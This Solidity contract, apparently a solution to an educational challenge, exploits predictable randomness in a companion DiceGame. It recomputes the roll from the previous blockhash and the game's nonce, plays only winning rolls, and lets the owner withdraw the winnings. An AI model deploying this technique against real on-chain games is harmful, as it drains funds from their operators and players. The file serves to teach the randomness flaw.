// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "hardhat/console.sol";

// Custom errors
error NotEnoughETH(uint256 required, uint256 available);
error NotWinningRoll(uint256 roll);
error InsufficientBalance(uint256 requested, uint256 available);

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    // Receive function to accept ETH
    receive() external payable {}

    // Rigged roll function that predicts the outcome
    function riggedRoll() external {
        // Check if contract has enough ETH
        uint256 required = 0.002 ether;
        uint256 available = address(this).balance;
        if (available < required) {
            revert NotEnoughETH(required, available);
        }

        // Predict the roll using the EXACT same logic as DiceGame
        bytes32 prevHash = blockhash(block.number - 1);
        uint256 nonce = diceGame.nonce();
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), nonce));
        uint256 roll = uint256(hash) % 16;

        console.log("\t", "Rigged Roll Prediction:", roll);

        // Only proceed if it's a winning roll (0-5)
        if (roll > 5) {
            revert NotWinningRoll(roll);
        }

        // Call rollTheDice with the required ETH
        diceGame.rollTheDice{value: required}();
    }

    // Withdraw function (Checkpoint 3)
    function withdraw(address _addr, uint256 _amount) public onlyOwner {
        // Check if contract has enough balance
        if (address(this).balance < _amount) {
            revert InsufficientBalance(_amount, address(this).balance);
        }

        // Transfer the amount to the specified address
        (bool sent, ) = _addr.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}
